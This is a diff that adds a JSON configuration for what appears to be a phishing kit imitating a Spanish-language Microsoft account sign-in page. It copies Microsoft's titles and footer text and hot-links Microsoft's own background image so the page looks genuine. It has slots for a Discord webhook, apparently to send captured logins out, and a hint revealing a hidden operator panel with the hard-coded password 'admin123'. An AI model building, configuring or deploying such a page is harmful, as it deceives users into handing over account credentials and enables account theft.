@@ -1,0 +1,15 @@
+{
+  "discordWebhook": "",
+  "discordMessageTemplate": "",
+  "appTitle": "Iniciar sesi\u00f3n en su cuenta",
+  "appSubtitle": "Use su cuenta de Microsoft.",
+  "loginBgType": "image",
+  "loginBgColor": "#0a0a1a",
+  "loginBgGradient": "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)",
+  "loginBgImage": "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
+  "footerHelpText": "Ayuda",
+  "footerTermsText": "T\u00e9rminos de uso",
+  "footerPrivacyText": "Privacidad y cookies",
+  "footerNoteText": "Usa la exploraci\u00f3n privada si este no es tu dispositivo. M\u00e1s informaci\u00f3n",
+  "panelAccessHint": "Doble tap en Ayuda + Privacidad y cookies \u2192 clave: admin123"
+}
